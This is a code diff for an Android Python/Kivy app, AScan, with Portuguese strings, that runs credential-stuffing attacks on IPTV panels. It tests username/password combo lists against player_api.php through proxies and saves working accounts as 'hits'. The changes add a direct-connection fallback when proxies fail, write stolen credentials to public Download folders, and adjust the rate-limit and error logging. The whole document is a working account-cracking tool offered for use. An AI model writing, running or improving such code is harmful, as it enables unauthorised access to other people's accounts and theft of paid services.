@@ -74,21 +74,26 @@ def storage_root():
     return os.path.expanduser('~')
 
 BASE = storage_root()
-# Pasta SEPARADA do script Pydroid (ele usa AScan_AgenT)
-OUT_DIR = os.path.join(BASE, 'AScan_App')
+OUT_DIR = os.path.join(BASE, 'AScan_App') if BASE else 'AScan_App'
 HITS_DIR = os.path.join(OUT_DIR, 'HITS')
 COMBO_HITS = os.path.join(OUT_DIR, 'COMBO')
+PUBLIC_HITS = None
 
 def ensure_dirs():
-    global OUT_DIR, HITS_DIR, COMBO_HITS
+    global OUT_DIR, HITS_DIR, COMBO_HITS, PUBLIC_HITS
     candidates = [
-        os.path.join(BASE, 'AScan_App'),
-        os.path.join(os.path.expanduser('~'), 'AScan_App'),
-        os.path.join('/sdcard', 'AScan_App'),
+        os.path.join('/storage/emulated/0/Download', 'AScan_App'),
+        os.path.join('/sdcard/Download', 'AScan_App'),
+        os.path.join(BASE, 'Download', 'AScan_App') if BASE else None,
         os.path.join('/storage/emulated/0', 'AScan_App'),
-        os.path.join('/storage/emulated/0/Android/data/com.ascan.ascanagent/files', 'AScan_App'),
+        os.path.join('/sdcard', 'AScan_App'),
+        os.path.join(BASE, 'AScan_App') if BASE else None,
+        os.path.join('/data/data/com.ascan.ascanagent/files', 'AScan_App'),
+        os.path.join(os.path.expanduser('~'), 'AScan_App'),
     ]
     for root in candidates:
+        if not root:
+            continue
         try:
             h = os.path.join(root, 'HITS')
             cmb = os.path.join(root, 'COMBO')
@@ -99,6 +104,8 @@ def ensure_dirs():
                 f.write('ok')
             os.remove(test)
             OUT_DIR, HITS_DIR, COMBO_HITS = root, h, cmb
+            if 'Download' in root or ('data/data' not in root and root.endswith('AScan_App')):
+                PUBLIC_HITS = h
             return root
         except Exception:
             continue
@@ -279,6 +286,11 @@ def check_target(server, item, timeout=8, proxy=None):
     server = norm_server(server)
     url = 'http://%s/player_api.php?username=%s&password=%s' % (server, user, pwd)
     data, code, err = fetch_json(url, timeout=timeout, server=server, proxy=proxy)
+    if proxy and err in ('ProxyError', 'ConnectTimeout', 'ConnectionError', 'ReadTimeout'):
+        data2, code2, err2 = fetch_json(url, timeout=timeout, server=server, proxy=None)
+        if data2 or (code2 and code2 not in (0,)):
+            data, code, err = data2, code2, err2
+            proxy = None
     meta = {'code': code, 'err': err, 'server': server}
     if data:
         st = str(data.get('user_info', {}).get('status', '')).lower()
@@ -373,6 +385,19 @@ def build_hit(server, item, data):
     )
     return txt, ilim
 
+def _write_hit_files(dir_hits, fn, block, ilim):
+    paths = [
+        os.path.join(dir_hits, fn),
+        os.path.join(dir_hits, 'HITS_GERAL.txt'),
+    ]
+    for path in paths:
+        with open(path, 'a', encoding='utf-8') as f:
+            f.write(block)
+    if ilim:
+        with open(os.path.join(dir_hits, 'ILIMITADOS.txt'), 'a', encoding='utf-8') as f:
+            f.write(block)
+    return paths[0]
+
 def save_hit(server, texto, ilim=False):
     try:
         ensure_dirs()
@@ -380,20 +405,27 @@ def save_hit(server, texto, ilim=False):
             host = server.split(':')[0].replace('.', '_')
             fn = '%s_%s.txt' % (datetime.datetime.now().strftime('%d-%m'), host)
             block = '[%s]\n%s\n\n' % (datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S'), texto)
-            paths = [
-                os.path.join(HITS_DIR, fn),
-                os.path.join(HITS_DIR, 'HITS_GERAL.txt'),
-            ]
-            for path in paths:
-                with open(path, 'a', encoding='utf-8') as f:
-                    f.write(block)
-            if ilim:
-                with open(os.path.join(HITS_DIR, 'ILIMITADOS.txt'), 'a', encoding='utf-8') as f:
-                    f.write(block)
+            main = _write_hit_files(HITS_DIR, fn, block, ilim)
+            if PUBLIC_HITS and PUBLIC_HITS != HITS_DIR:
+                try:
+                    _write_hit_files(PUBLIC_HITS, fn, block, ilim)
+                except Exception:
+                    pass
+            elif 'data/data' in (HITS_DIR or ''):
+                for pub in (
+                    os.path.join('/storage/emulated/0/Download', 'AScan_App', 'HITS'),
+                    os.path.join('/sdcard/Download', 'AScan_App', 'HITS'),
+                ):
+                    try:
+                        os.makedirs(pub, exist_ok=True)
+                        _write_hit_files(pub, fn, block, ilim)
+                        break
+                    except Exception:
+                        continue
             STATS['hits'] += 1
             if ilim:
                 STATS['hits_ilimitados'] += 1
-            return paths[0]
+            return main
     except Exception as e:
         return 'ERR:%s' % e
 
@@ -575,6 +607,9 @@ class AScanApp(App):
         rowp.add_widget(bp2)
         rowp.add_widget(bp3)
         card.add_widget(rowp)
+        tip_p = T('Dica: proxy free deixa lento. Use Limpar p/ direto ou cole bons proxies', size=10, muted=True)
+        tip_p.height = dp(20)
+        card.add_widget(tip_p)
         body.add_widget(card)
 
         card = RCard()
@@ -614,7 +649,7 @@ class AScanApp(App):
         self.sl['per'] = T('Servidores: -', size=11, muted=True)
         self.sl['per'].height = dp(36)
         card.add_widget(self.sl['per'])
-        self.sl['path'] = T('Hits: %s' % HITS_DIR, size=10, muted=True)
+        self.sl['path'] = T('Hits: %s' % (PUBLIC_HITS or HITS_DIR), size=10, muted=True)
         self.sl['path'].height = dp(22)
         card.add_widget(self.sl['path'])
         body.add_widget(card)
@@ -649,7 +684,7 @@ class AScanApp(App):
             self.log.text = line
         else:
             lines = (cur + '\n' + line).split('\n')
-            self.log.text = '\n'.join(lines[-50:])
+            self.log.text = '\n'.join(lines[-35:])
 
     def set_combo(self, items, name):
         global COMBO_NAME
@@ -835,7 +870,7 @@ class AScanApp(App):
         self.btn_go.disabled = True
         for s in servers:
             self.log_msg('SRV %s' % s)
-        self.log_msg('Hits em: %s' % HITS_DIR)
+        self.log_msg('Hits: %s' % (PUBLIC_HITS or HITS_DIR))
         with PROXY_L:
             np = len(PROXIES)
         self.log_msg('Proxies: %d | Start %d srv | %d combo | %d thr' % (
@@ -879,7 +914,7 @@ class AScanApp(App):
                             elif '429' in str(err) or code == 429:
                                 self.stats['err429'] += 1
                                 ps['err'] += 1
-                            elif err in ('Timeout', 'ConnectTimeout', 'ReadTimeout', 'ConnectionError'):
+                            elif err in ('Timeout', 'ConnectTimeout', 'ReadTimeout', 'ConnectionError', 'ProxyError'):
                                 self.stats['timeout'] += 1
                                 ps['err'] += 1
                             elif err not in ('inactive', 'ok', 'bad_json'):
@@ -893,16 +928,17 @@ class AScanApp(App):
                         tag = 'ILIM' if ilim else 'HIT'
                         if isinstance(saved, str) and saved.startswith('ERR:'):
                             Clock.schedule_once(
-                                lambda dt, s=server, u=item[0], tg=tag, er=saved: self.log_msg('%s %s | %s  SAVE_FAIL %s' % (tg, s, u, er)), 0)
+                                lambda dt, s=server, u=item[0], tg=tag, er=saved: self.log_msg('%s %s | %s FAIL %s' % (tg, s, u, er)), 0)
                         else:
                             Clock.schedule_once(
-                                lambda dt, s=server, u=item[0], tg=tag: self.log_msg('%s %s | %s  OK AScan_App/HITS' % (tg, s, u)), 0)
+                                lambda dt, s=server.split(':')[0][:18], u=item[0][:12], tg=tag: self.log_msg('%s %s | %s' % (tg, s, u)), 0)
                     else:
                         with _lock:
                             n = self.stats['checks']
-                        if n % 25 == 0 and err:
+                        if n % 40 == 0 and err and err != 'ProxyError':
+                            short = server.split(':')[0][:22]
                             Clock.schedule_once(
-                                lambda dt, s=server, e=err, c=code: self.log_msg('%s -> %s (%s)' % (s, e, c)), 0)
+                                lambda dt, s=short, e=err, c=code: self.log_msg('%s  %s' % (s, e if e != ('http_%d' % c) else str(c))), 0)
                 except Exception:
                     with _lock:
                         self.stats['other'] += 1
@@ -927,9 +963,9 @@ class AScanApp(App):
         self.scan_running = False
         self.btn_go.disabled = False
         self.lbl_status.text = '[color=22C55E]*[/color] Pronto'
-        self.log_msg('Fim | Hits %d | Checks %d | 403=%d 429=%d TO=%d' % (
+        self.log_msg('Fim | Hits %d | Checks %d | 403=%d TO=%d' % (
             self.stats['hits'], self.stats['checks'],
-            self.stats.get('err403', 0), self.stats.get('err429', 0), self.stats.get('timeout', 0)))
+            self.stats.get('err403', 0), self.stats.get('timeout', 0)))
         if self.clock:
             self.clock.cancel()
 
@@ -954,7 +990,7 @@ class AScanApp(App):
         if 'errs' in self.sl:
             self.sl['errs'].text = '403:%d 429:%d TO:%d' % (e403, e429, eto)
         if 'path' in self.sl:
-            self.sl['path'].text = 'Hits: %s' % HITS_DIR
+            self.sl['path'].text = 'Hits: %s' % (PUBLIC_HITS or HITS_DIR)
         if 'px' in self.sl:
             with PROXY_L:
                 np = len(PROXIES)
